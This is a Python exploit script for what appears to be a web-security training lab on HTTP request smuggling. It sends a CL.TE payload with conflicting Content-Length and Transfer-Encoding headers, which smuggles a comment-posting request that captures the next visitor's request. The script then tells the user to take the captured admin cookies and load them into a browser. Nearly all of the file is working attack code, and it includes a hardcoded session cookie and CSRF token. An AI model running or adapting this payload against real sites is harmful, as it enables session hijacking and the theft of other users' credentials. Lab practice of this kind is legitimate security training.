import ssl
import time
import socket

def ssl_cert(host, req):
    req = req.replace('\n', '\r\n')
    print("\n" + "="*60)
    print("Sending Request:")
    print(req[:100])
    print("="*60)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    ssl_traffic = ctx.wrap_socket(sock, server_hostname=host)
    ssl_traffic.connect((host, 443))
    ssl_traffic.send(req.encode())
    
    response = ssl_traffic.recv(8096).decode()
    ssl_traffic.close()
    
    return response

def respnse_status(host, req1, req2, resp1, resp2, attempt=1):
    print(f"\n[Check #{attempt}]")
    
    # Make uppercase for case-insensitive check
    resp1_upper = resp1.upper()
    resp2_upper = resp2.upper()
    
    if "200 OK" in resp1_upper:
        print("First request got 200 OK ✓")
        print("\n" + "="*60)
        print("First response:")
        print(resp1[:800])
        print("="*60)
        
        if "200 OK" in resp2_upper:
            print("\n" + "="*60)
            print("Second request got 200 OK ✓")
            print("Second response:")
            print(resp2[:2000])
            print("\n✓ Take smuggled Admin cookies from above")
            print("and update in browser to solve the lab")
            print("="*60)
            return True
            
        elif "302" in resp2_upper:
            print("Second request got 302 redirect")
            print("Getting new responses...")
            
            # Get new responses
            new_resp1 = ssl_cert(host, req1)
            time.sleep(0.5)
            new_resp2 = ssl_cert(host, req2)
            
            # Try again (max 10 times)
            if attempt < 10:
                return respnse_status(host, req1, req2, new_resp1, new_resp2, attempt + 1)
            else:
                print("Too many tries (10), stopping")
                return False
        else:
            print("Second request issue")
            print("Response:", resp2[:200])
            return False
    else:
        print("First request issue")
        print("Response:", resp1[:200])
        return False

if __name__ == "__main__":
    print("="*60)
    host = input("Enter hostname: ").strip()
    print("="*60)
    print("Lab: Exploiting HTTP request smuggling to capture other users' requests")
    print("="*60)

    # Your requests - FIXED host in req2
    req1 = f"""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 278
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=ssJzWQzywhiwfR5yGHL1bz4wqTdhQK4o
Content-Type: application/x-www-form-urlencoded
Content-Length: 950

csrf=8RDL9C400HyZ3D6UTiMBQueiTXfmex1M&postId=8&name=test&email=test%40test.thm&website=https%3A%2F%2Ftest.com&comment=test"""
    
    # FIXED: Changed hardcoded host to {host}
    req2 = f"""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 745

Foo=bar
















































































































































































































































































































































































"""
    
    # Get initial responses
    resp1 = ssl_cert(host, req1)
    time.sleep(0.5)
    resp2 = ssl_cert(host, req2)
    
    # Check responses
    success = respnse_status(host, req1, req2, resp1, resp2, 1)
    
    if success:
        print("\n✅ Done!")
    else:
        print("\n❌ Failed")
